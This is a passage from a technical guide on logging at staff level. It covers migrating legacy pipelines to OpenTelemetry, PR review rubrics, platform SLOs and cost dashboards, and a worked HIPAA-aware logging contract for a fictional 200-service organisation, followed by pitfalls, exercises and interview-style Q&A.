### 11. Logs as the only debuggable surface

If logs are the only way to debug your service, your service is under-instrumented. Traces and metrics should cover the structural questions; logs handle the narrative.

---

## Migrating an Old Logging System

A staff-level migration is usually a year-long effort. The phased plan:

```text
Phase 1 — Standardize timestamps  (week 1–4)
  Every service emits RFC3339 UTC nanoseconds.
  Audit with collector processor.

Phase 2 — Standardize JSON         (week 4–12)
  Every service emits one JSON object per line.
  Replace printf-style log lines with structured calls.

Phase 3 — Mandatory fields         (week 12–24)
  Add the 9 mandatory fields via the org SDK.
  Quarantine non-compliant lines but don't drop yet.

Phase 4 — Add request_id / trace_id (week 24–32)
  Instrument middleware to inject context.
  Backfill cross-service correlation.

Phase 5 — Tail-based sampling      (week 32–40)
  Enable in staging; verify error capture rate.
  Enable in prod 1% → 10% → 100%.

Phase 6 — Decommission old pipeline (week 40–52)
  Shadow-write for 4 weeks.
  Compare query results.
  Sunset old indexes, archive cold copies.
```

### "Boundary first" — start at the edge

The edge services (ingress, API gateway, auth) are where requests enter. Standardizing them first gives you a known-good source of `request_id` that flows everywhere. Trying to standardize a leaf service first is wasted effort because its upstream still emits chaos.

### Shadow-write pattern

For 2–4 weeks, emit to both old (Fluentd → ES) and new (OTel Collector → Datadog). Run the same query on both. Track:

- Volume parity (within 1%).
- Field presence (mandatory fields ≥ 99.9%).
- Query result divergence (errors found in one but not the other).

Cut over only when parity is solid.

### Decommissioning old indexes

The mistake: deleting too soon. The right order:

1. Stop *writing* to the old index.
2. Wait through the retention period (e.g. 30 days) — queries may still come.
3. Export a final snapshot to S3 Glacier (compliance-grade archive).
4. Verify archive integrity (hash, sample restore).
5. Delete the index.
6. Document the archive location and key.

---

## Team-Level Practice

### Code review rubric for logs (10 items)

Use this as a checklist in PR reviews. Block PRs that fail more than 2.

1. Is every log line structured (no `printf` concatenation)?
2. Does the line have a stable `event_type` so it can be grouped?
3. Are field names from the org schema (no `req_id` if contract says `request_id`)?
4. Does the line include `tenant_id` if the operation is tenant-scoped?
5. Is severity appropriate (no `ERROR` for expected business outcomes)?
6. Are there secrets, PII, JWTs, or full PANs anywhere in the line?
7. Is `ctx` passed so trace/span IDs propagate?
8. Is the line worth the cost — would a metric or a span event be better?
9. Will this line still be readable in 6 months without seeing the surrounding code?
10. If this fires at 3 am, does it give enough context to act, or does it just say "something happened"?

### "Will this be readable in 6 months?"

A senior heuristic that becomes a *required* check at staff level. The on-call engineer at 3 am has never seen this code. The log line must be intelligible alone. Avoid abbreviations only the author knows (`tx_st=3`). Spell out (`transaction_state="pending_capture"`).

### Logging in tests

- **Unit tests:** mostly no. Tests should assert on behavior, not log content. Asserting on log strings makes tests brittle.
- **Integration tests:** yes, attach the same logging pipeline, verify mandatory fields. Treat the test as a customer.
- **Test the logging contract itself:** a contract test that takes a sample log line from each service and runs it through the schema lint.

### Log review as post-mortem step

Every post-mortem includes a step: *"were the logs sufficient to debug this?"* Capture:

- Lines that should have existed but didn't.
- Lines that fired at the wrong severity.
- Lines that were dropped by sampling but were needed.
- Field-naming inconsistencies that slowed correlation.

Feed findings into the next iteration of the contract.

## Observability Platform-Team Responsibilities

The platform team owns the logging *product*. Its responsibilities:

### SLOs on the logging pipeline

| SLO | Target | Window |
|---|---|---|
| Ingestion availability | 99.9% | 30 days |
| End-to-end freshness p95 | < 30 seconds | 30 days |
| Drop rate (non-quarantine) | < 0.01% | 30 days |
| Query availability | 99.5% | 30 days |
| Schema conformance | > 99% | 7 days |

Track on a dashboard; alert on burn rate; budget error budget like any other service.

### Cost dashboards

Per-team monthly GB ingested. Per-service top 20 noisiest. Cardinality top 20 fields. Forecast vs budget. Surface trends *before* they become invoices.

### Schema enforcement

Run the schema lint processor in every collector. Quarantine non-compliant lines. Publish the violation rate per service. Make non-compliance a tracked metric, not a vibe.

### Tenant onboarding playbook

A new tenant or new internal team gets:

1. A namespace in the contract (`team.*` field prefix).
2. A log budget allocation (GB/month).
3. A starter SDK config tuned for their language.
4. An onboarding doc + a single Slack channel for questions.
5. A 1-month grace period before chargeback starts.

### Disaster recovery for archives

Audit logs are compliance assets. They have:

- An RPO (Recovery Point Objective) — how much data we can lose. Usually 0 for audit, hours for app logs.
- An RTO (Recovery Time Objective) — how fast we can restore. Usually days for cold archives.
- Cross-region replication.
- Quarterly restore tests — actually restore from archive and verify.

---

## Worked Example — 200-Service Org Logging Contract

Let's design the contract for a fictional org **"Lattice Corp"** — 200 microservices, 4 regions, 800 engineers, mixed Go/Python/Java/Node, SOC 2 + HIPAA in scope.

### Step 1 — Mandatory fields

The 9 from the canonical contract above, plus HIPAA-specific:

```text
+ phi_accessed   bool — true if this log line is in a code path that touched PHI
+ purpose        enum — TREATMENT|PAYMENT|OPERATIONS|RESEARCH (HIPAA purpose code)
```

### Step 2 — Forbidden list

```text
- raw email, phone, full name
- date of birth
- SSN, full PAN, CVV
- JWT/refresh tokens
- internal API keys
- raw IP (truncate to /24 for IPv4, /48 for IPv6)
- multi-line strings without escape
```

### Step 3 — Routing

```text
Application logs   → OTel Collector → Datadog (hot 7d) → S3 (warm 90d) → Glacier (cold 13mo)
Audit logs         → OTel Collector → S3 Object Lock (immutable, 7yr) + cross-region
HIPAA audit logs   → Separate collector with dedicated KMS key → AWS HealthLake-adjacent store
Debug logs (prod)  → Off by default; dynamic level via control plane
```

### Step 4 — Sampling

```text
Application:    tail sampling, keep 100% errors, 100% >1s, 1% rest
Audit:          never sampled
HIPAA:          never sampled
Per team:       budget of 50GB/month; over-budget = chargeback
```

### Step 5 — SLO

```text
Ingestion availability:  99.9%
Freshness p95:           < 30s
Schema conformance:      > 99.5%
Audit log durability:    11 nines (Object Lock)
```

### Step 6 — Org-wide SDK

Four SDKs (Go/Python/Java/Node), each:

- Embeds the mandatory fields from env vars.
- Refuses forbidden field names at compile time where possible (Go: linter; Java: SpotBugs rule).
- Auto-injects `trace_id`, `span_id`, `tenant_id` from context.
- Provides `log.AuditAccess(ctx, resource, purpose)` as a separate API that writes to the audit pipeline.

### Step 7 — Rollout

- Quarter 1: top 10 services adopt the SDK; iterate.
- Quarter 2: edge services + payments domain.
- Quarter 3: remaining 180 services.
- Quarter 4: turn on schema lint enforcement; decommission old pipelines.

### Step 8 — Steady state

Platform team has 4 engineers running this. Annual review of contract. Quarterly cost review with finance. Monthly post-mortem readout of "logs that failed us."

## Edge Cases & Pitfalls

- **Logger initialized before resource attributes are loaded** — emits early lines with missing `service.name`. Use a deferred init or queue early lines.
- **Logger holds onto a `context.Context`** — leaks request data into unrelated lines. Always pass ctx per call.
- **OTel SDK panics on shutdown if logs are in flight** — flush before exit; handle SIGTERM with grace.
- **Tail sampling drops the "lead-up" lines to an error** — fix by raising the decision window to span the whole request lifecycle.
- **`tenant_id` propagation breaks at goroutine/thread boundaries** — explicit propagation in `errgroup`, `ExecutorService`, etc.
- **Multi-tenant query proxy bypass via direct ES API** — disable direct API; force proxy.
- **Audit log clock skew across hosts** — sync via NTP; reject events with skew > 5s.
- **S3 Object Lock retention mistakes** — once set, it cannot be reduced. Test in dev first.
- **Schema lint drops a field everyone depends on** — roll out lint in "tag only" mode for 2 weeks before enforcing.
- **OTel Collector OOM under burst** — set `memory_limiter` processor; back-pressure to the receivers.

---

## Common Mistakes

1. Treating logging as a library problem instead of a platform product.
2. Letting each team pick its own field names.
3. Storing logs in Elasticsearch and being surprised by the bill.
4. Mixing audit logs and application logs in the same pipeline.
5. Logging IP addresses without considering GDPR.
6. Sampling head-based (by hash) when you needed tail-based (by outcome).
7. Forgetting to set up a DLQ for schema-violating lines.
8. Not flushing on shutdown — losing the last 5 seconds of logs from a crashing pod.
9. Coupling alerts to log strings instead of metrics derived from logs.
10. Onboarding teams without a budget allocation — they overshoot, then the platform team eats the cost.
11. Designing for "search any field" instead of designing the query patterns first.
12. Building a per-tenant index strategy that doesn't scale past 1000 tenants.
13. Letting the OTel Collector run with default memory limits in production.
14. Forgetting that `log.error(exception)` may include the SQL query that had the API key in it.
15. Building the platform without a chargeback model and losing budget authority next year.

---

## Tricky Points

- **OTel logs are still maturing.** The data model is stable; some SDKs (especially older ones) lag. Plan for SDK upgrades quarterly.
- **`severity_number` is the wire field, `severity_text` is for humans.** Compare on numbers; display strings.
- **Wide events vs traditional logs are not either/or.** You may run both pipelines and let teams choose. Most large orgs do.
- **Tail-based sampling has a memory cost in the collector** — you buffer all spans/logs for a request until the decision is made. Size accordingly.
- **GDPR right to erasure on logs is genuinely hard.** Most orgs argue logs are "legitimate interest" with bounded retention, but document the legal basis.
- **Audit log immutability via hash chain** — append-only is not enough; use a Merkle chain so any retroactive edit is detectable.
- **The collector is now a critical path.** It needs HA, autoscaling, and its own observability — a second collector watching the first.
- **Loki is cheap for storage, expensive for high-cardinality queries.** Pick by query pattern, not just by marketing.
- **OTel semconv (semantic conventions) evolve** — `http.status_code` was once `http.response.status_code`. Pin a version per service.
- **Multi-region log routing has data-residency implications.** EU logs must stay in EU; cross-region routing without a DPA is a GDPR violation.

## Test Yourself

1. Design a logging contract for a 50-service Go monolith-decomposition project. Pick the 7 mandatory fields and justify each.
2. Calculate the annual savings of tail-based sampling for a system at 50k req/s, 1.2 KB/log, $1.50/GB ingested, 1% normal/100% error retention.
3. Write an OTel Collector pipeline config that quarantines logs missing `service.name` to a DLQ.
4. Design the audit log storage strategy for a HIPAA-regulated SaaS with 7-year retention and quarterly restore tests.
5. Sketch a chargeback model: per-team logging budget, overage policy, and the finance integration. What does the dashboard look like?
6. Write a migration plan to move 200 services from Logstash/Elasticsearch to OTel/Loki over 12 months. Identify the 3 highest-risk steps.
7. A team complains their dashboards show fewer errors after migrating to tail-based sampling. Diagnose three plausible causes and design tests to confirm.
8. Design a per-tenant ACL layer for Grafana over Loki such that internal SRE can query cross-tenant only via an audited break-glass procedure.

## Tricky Questions

**Q1: A team wants to log full HTTP request bodies for debugging. The legal team says no. The team says they need it. Resolve.**
A: This is a contract-design conversation, not a yes/no. Offer (a) bodies redacted via deny-list; (b) sampled bodies with retention < 24h in a separately ACL'd index; (c) on-demand body capture via control plane during incidents. Pick (c) — preserves debuggability without standing PII risk.

**Q2: Why is head-based sampling almost always wrong for production?**
A: It decides at the start whether to keep a request, before you know if it errored or was slow. You drop interesting requests proportionally to boring ones. Tail-based decides after the request completes — it can preserve 100% of errors and slow tails at a fraction of the cost.

**Q3: Datadog charges per GB ingested. You sample to 5% and your bill barely drops. Why?**
A: Sampling probably happened at the SDK, not the collector — Datadog still received and counted the bytes before sampling. Move the decision to the collector or to the exporter, before the wire. Also check: live tail and indexed fields may have separate cost lines.

**Q4: Two services emit `user_id` — one as int, one as string. What breaks?**
A: Index type conflicts. Elasticsearch picks the first type it sees and rejects subsequent writes. Loki tolerates it but queries that filter on type fail. Honeycomb keeps both as separate columns. Fix: the contract specifies the type; the SDK enforces; the lint catches drift.

**Q5: Why is logging in unit tests usually wrong?**
A: Asserting on log strings couples tests to a presentation detail. Refactor the message and the test breaks. Logs are for humans at 3 am; tests are for machines. Test the behavior, log the narrative. Exception: assert that *a* line was emitted for an audit event, since that is the behavior.

**Q6: Your OTel Collector is OOMing under traffic spikes. The processor list has tail_sampling with a 30s window. Why is this related, and what do you change?**
A: Tail sampling buffers all records for a request for the decision window. At high RPS, the buffer can balloon. Either shrink the window, add memory_limiter ahead of it, scale horizontally (multiple collector instances with consistent hashing on trace_id), or split application vs audit pipelines so audit doesn't share the budget.

**Q7: A staff engineer says "we should rip out Datadog and use Loki." What's your decision framework?**
A: Calculate (a) ingestion cost, (b) query patterns and Loki's cost on them, (c) feature parity (live tail, anomaly detection), (d) migration risk over 12 months. If Datadog costs $3M and Loki + operational team costs $800k including engineering time, the switch may make sense. But never switch only on price — switch on *price per useful query*.

**Q8: How do you prevent a `log4j`-style RCE in your own org's logging SDK?**
A: Never interpolate user-controlled strings through any lookup/expression mechanism. Disable features like message templating that perform anything other than string substitution. Treat the logger as a sink, not a script interpreter. Audit dependencies quarterly.

## Summary

- Logging at staff/principal level is a **platform product**, not a library decision. You ship a contract, an SDK, a collector, and SLOs.
- **9 mandatory fields**, enforced at the collector via schema lint, are the load-bearing piece of org-wide joinability.
- **Cost engineering is a first-class constraint** — tail-based sampling is the highest-leverage optimization; per-team budgets prevent tragedy of the commons.
- **Compliance** (GDPR, HIPAA, SOC 2, PCI) imposes concrete rules on what your logs may contain, who may read them, and how long they live. Audit logs and application logs are separate systems.
- **OpenTelemetry** unifies logs, metrics, and traces; the OTel Collector decouples instrumentation from vendor, making swaps cheap.
- **Observability 2.0 / wide events** (Honeycomb) treats logs and metrics as queries over a single columnar event table; powerful when paired with OTel.
- **Multi-tenant logging** requires `tenant_id` propagation, ACL at the query layer, and a break-glass procedure for cross-tenant security work.
- **Libraries don't own loggers** — they accept one via DI and never log secrets.
- **Migration** of a legacy logging system is a year-long phased plan: timestamps → JSON → mandatory fields → trace context → sampling → cutover.
- The platform team owns **SLOs, cost dashboards, schema enforcement, tenant onboarding, and DR for archives** — like any other internal SaaS product.

## What You Can Build

- A reusable **logging SDK** for your org (Go/Python/Java/Node) implementing the 9-field contract.
- An **OTel Collector config repository** with environment-specific overlays, schema lint, tail-sampling, DLQ, and HA.
- A **per-team cost dashboard** that joins billing GB to `service.name` and rolls up by team.
- A **schema-conformance scoreboard** showing per-service violation rate and trend.
- A **break-glass query proxy** for Loki/Datadog that injects tenant ACLs and logs every cross-tenant query.
- A **shadow-write comparator** that runs the same query against old and new pipelines and reports divergence.
- A **library DI logger** kit with no-op default and tests proving the lib emits nothing when no logger is provided.
- A **HIPAA audit pipeline** with S3 Object Lock, hash chain, and quarterly restore test automation.
